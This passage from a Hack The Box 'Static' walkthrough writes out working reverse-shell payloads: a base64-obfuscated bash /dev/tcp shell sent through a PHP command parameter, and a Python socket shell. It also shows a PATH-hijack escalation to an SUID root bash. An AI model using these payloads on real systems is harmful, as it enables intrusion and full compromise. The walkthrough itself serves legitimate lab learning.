./curl-amd64 -s http://192.168.254.3/index.php?a=/bin/bash%20-c%20%27echo%20-n%20L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA%2BJjEn%20%7C%20base64%20-d%20%7C%20bash%27
```

Before we execute this on the web box we need a second SSH session open with nc waiting to catch the shell:

```text
┌──(root💀kali)-[~/htb/static]
└─# ssh -i id_rsa www-data@10.10.10.246 -p 2222                                     
Last login: Sat Nov  6 16:04:52 2021 from 10.10.15.41

www-data@web:~$ cd /tmp
www-data@web:/tmp$ ./nc -nlvp 1337
listening on [any] 1337 ...
```

Now paste our curl command on the first SSH sesion we opened on the web box:

```text
www-data@web:/tmp$ ./curl-amd64 -s http://192.168.254.3/index.php?a=/bin/bash%20-c%20%27echo%20-n%20L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA%2BJjEn%20%7C%20base64%20-d%20%7C%20bash%27
```

## PKI Server Reverse Shell

Switch to our second SSH session to see we have a reverse shell connected to pki box on 192.168.254.2:

```text
www-data@web:/tmp$ ./nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 34382
bash: cannot set terminal process group (11): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pki:~/html$ 
```

We could have done a one liner instead to create our payload and execute all in one:

```text
www-data@web:/tmp$ python3 -c "import urllib.parse; import os; PAYLOAD=('./curl-amd64 -s http://192.168.254.3/index.php?a='); PAYLOAD+=(urllib.parse.quote('/bin/bash -c \'echo -n L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA+JjEn | base64 -d | bash\'')); os.system(PAYLOAD)"
```

Another option would have been a Python script using the [requests](https://docs.python-requests.org/en/latest/user/quickstart/#make-a-request) library:

```python
#!/usr/bin/env python
import requests
payload = '/usr/bin/python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\''
requests.get("http://192.168.254.3/index.php?a="+payload)
```

If you want to do it this way then put the above Python in a file called script.py and upload it to the box:

```sh
┌──(root💀kali)-[~/htb/static]
└─# scp -P 2222 -i id_rsa script.py www-data@10.10.10.246:/tmp
script.py                        100%  353    16.4KB/s   00:00
```

Then on the web box execute it:

```text
www-data@web:/tmp$ chmod +x script.py
www-data@web:/tmp$ ./script.py
```

Whichever way we got our shell, now it's time to have a look around on this new pki box. However there is not much here with no home folder and passwd file showing only root can login:

```text
www-data@pki:~/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

## Ersatool

Earlier when accessing port 80 on the pki box we got this response:

```text
batch mode: /usr/bin/ersatool create|print|revoke CN
```

Looking for that binary also finds it's soruce code:

```text
www-data@pki:~/html$ find / -name ersa* 2>/dev/null                                                 
find / -name ersa* 2>/dev/null
/usr/src/ersatool.c
/usr/bin/ersatool
```

I reviewed the source code for the ersatool but I'm not good at C and couldn't make much sense of it. Instead we can either copy the .c file to Kali, compile it and then use a debugger like Ghidra to analyse how it works. Or we can use [pspy64](https://github.com/DominicBreuker/pspy) like we did on other boxes such as [Curling](https://www.hackthebox.com/home/machines/profile/160) and [Teacher](https://www.hackthebox.com/home/machines/profile/165) to look at running processes. I'm going with pspy64 because it's easy to use, so let's download it to Kali then copy to the web server:

```sh
┌──(root💀kali)-[~/htb/static]
└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
--2021-11-06 21:03:26--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’
pspy64            100%[===============================================>]   2.94M  16.7MB/s    in 0.2s    
2021-11-06 21:03:27 (16.7 MB/s) - ‘pspy64’ saved [3078592/3078592]

┌──(root💀kali)-[~/htb/static]
└─# scp -P 2222 -i id_rsa pspy64 www-data@10.10.10.246:/tmp 
pspy64                         100% 3006KB   2.3MB/s   00:01
```

With the file on the web box we need to start our web server to be able to get to it from the pki box:

```text
www-data@web:/tmp$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

## Bash Wget Alternative

Now we need to pull pspy64 across to the pki box which isn't easy as it hasn't got nc, wget, curl or anything else useful. Searching there's lots of examples of how to use echo, exec, sed and others that are available to us like [this](https://www.shell-tips.com/bash/download-files-from-shell) one, [this](https://superuser.com/questions/40545/upgrading-and-installing-packages-through-the-cygwin-command-line/496572#496572) one or [this](https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et) one.

Just copy one of the examples and paste in to your shell on the pki server:

```shxt
function _get() {
    read proto server path <<<$(echo ${1//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
    (while read line; do
        [[ "$line" == $'\r' ]] && break
    done && cat) <&3
    exec 3>&-
}
```

Now we can use that function:

```text
www-data@pki:/tmp$ _get http://192.168.254.2:8000/pspy64 > pspy64
_get http://192.168.254.2:8000/pspy64 > pspy64

www-data@pki:/tmp$ ls -lsa p*
ls -lsa p*
3008 -rw-r--r-- 1 www-data www-data 3078592 Nov  6 20:47 pspy64

www-data@pki:/tmp$ chmod +x pspy64
```

## Pspy64

So we have pspy64 copied across and made it executable, now we run it so it watches what we are doing:

```text
www-data@pki:/tmp$ ./pspy64
./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...done
```

While pspy64 is watching we need another session to the pki box so we can interact with the ersatool. Just repeat the same process above to base64 and URL encode you're payload, then use the exploit on the web box again to trigger the remote command execution. I used port 1338 for this second connection to the pki box as the first one running pspy64 was on port 1337:

```text
┌──(root💀kali)-[~/htb/static]
└─# ssh -i id_rsa www-data@10.10.10.246 -p 2222
Last login: Sat Nov  6 21:56:12 2021 from 10.10.15.41

www-data@web:~$ cd /tmp
www-data@web:/tmp$ ./nc -nlvp 1338
listening on [any] 1338 ...
connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 50620
bash: cannot set terminal process group (16): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pki:/tmp$
```

Now we can use the ersatool:

```text
www-data@pki:/tmp$ ersatool
ersatool
# create
create->CN=a
client
dev tun9
proto udp
remote vpn.static.htb 1194
resolv-retry infinite
nobind
user nobody
group nogroup
persist-key
persist-tun

remote-cert-tls server

cipher AES-256-CBC
#auth SHA256
key-direction 1
verb 3
<ca>
-----BEGIN CERTIFICATE-----
MIIDRzCCAi+gAwIBAgIUR+mYrXHJORV4tbg81sQS7RfjYK4wDQYJKoZIhvcNAQEL
BQAwFDESMBAGA1UEAwwJc3RhdGljLWd3MCAXDTIwMDMyMjEwMTYwMVoYDzIxMjAw
<SNIP>
2aafeb626aadb6abc35fa023426c9334
ea5f5af8329f367f112599f3e668bd7a
-----END OpenVPN Static key V1-----
</tls-auth>
create->CN=
# exit
```

The output was long, and from it you can see various keys and files are generated. If we switch back to our other session on the pki box we see something interesting in pspy64:

```text
2021/11/06 22:04:27 CMD: UID=0    PID=1999   | mktemp /opt/easyrsa/pki/private/b.key.XXXXXXXXXX 
2021/11/06 22:04:27 CMD: UID=0    PID=2000   | mktemp /opt/easyrsa/pki/reqs/b.req.XXXXXXXXXX 
2021/11/06 22:04:27 CMD: UID=0    PID=2001   | openssl req -utf8 -new -newkey rsa:2048 -config /opt/easyrsa/pki/safessl-easyrsa.cnf -keyout /opt/easyrsa/pki/private/b.key.NjeDhJwbbp -out /opt/easyrsa/pki/reqs/b.req.8mbUvtOvx6 -nodes -batch
2021/11/06 22:04:27 CMD: UID=0    PID=2002   | mv /opt/easyrsa/pki/private/b.key.NjeDhJwbbp /opt/easyrsa/pki/private/b.key 
2021/11/06 22:04:27 CMD: UID=0    PID=2003   | /bin/sh /opt/easyrsa/easyrsa build-client-full b nopass batch 
2021/11/06 22:04:27 CMD: UID=0    PID=2004   | openssl rand -hex -out /opt/easyrsa/pki/serial 16 
2021/11/06 22:04:27 CMD: UID=0    PID=2005   | /bin/sh /opt/easyrsa/easyrsa build-client-full b nopass batch 
2021/11/06 22:04:27 CMD: UID=0    PID=2006   | /bin/sh /opt/easyrsa/easyrsa build-client-full b nopass batch 
2021/11/06 22:04:27 CMD: UID=0    PID=2019   | mv /opt/easyrsa/pki/issued/b.crt.ov6cEU0tHL /opt/easyrsa/pki/issued/b.crt 
```

## Path Exploitation

A few of the commnads executed haven't got a full path to the binary. From above we see mktemp, openssl and mv are all called directly which means the paths in the environment variable are used to find them. This is a well known escalation path with a good explanation [here](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/) and one I used on another box called [Previse](https://www.hackthebox.com/home/machines/profile/373).

First we create a file in the /tmp folder with the name of one of the commands we see with no path specified, I'm using openssl for this one. There's no text editor on the pki box so let's do it on Kali then we can copy the base64 over to the box:

```text
┌──(root💀kali)-[~/htb/static]
└─# echo "#\!/bin/bash                                                                                           
/bin/cp /bin/bash /tmp/bash
chmod u+s /tmp/bash" | base64          
IyEvYmluL2Jhc2gKL2Jpbi9jcCAvYmluL2Jhc2ggL3RtcC9iYXNoCmNobW9kIHUrcyAvdG1wL2Jhc2gK
```

Now paste that over on the box decoding it back to that multiline bash script and outputing it to a file called openssl:

```text
www-data@pki:/tmp$ echo "IyEvYmluL2Jhc2gKL2Jpbi9jcCAvYmluL2Jhc2ggL3RtcC9iYXNoCmNobW9kIHUrcyAvdG1wL2Jhc2gK" | base64 -d > openssl
www-data@pki:/tmp$ ls -lsa
ls -lsa
   4 -rwxr-xr-x 1 www-data www-data      60 Nov  6 19:40 openssl
```

Add our /tmp path to the beginning on the environment $PATH variable:

```text
www-data@pki:/tmp$ export PATH=/tmp:$PATH
www-data@pki:/tmp$ echo $PATH  
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## Root Flag

Go back to the other session and interact with the ersatool. Then when it attmpts to use openssl it will use our version instead because /tmp is in the path list before /usr/bin where the actual file exists.

Check the /tmp folder to see bash has been copied to it and the sticky bit is set:

```text
www-data@pki:/tmp$ ls -lsa
ls -lsa
   4 -rwxr-xr-x 1 www-data www-data      40 Nov  6 19:33 openssl
1088 -rws------ 1 root     www-data 1113504 Nov  6 19:38 bash
```

Finally we can escalate to root and grab the flag:

```text
www-data@pki:/tmp$ bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
cat /root/root.txt
<HIDDEN>
```

That was a long and difficult box, but fun and I learnt a few things so worth it. I hope you enjoyed it too. See you next time.
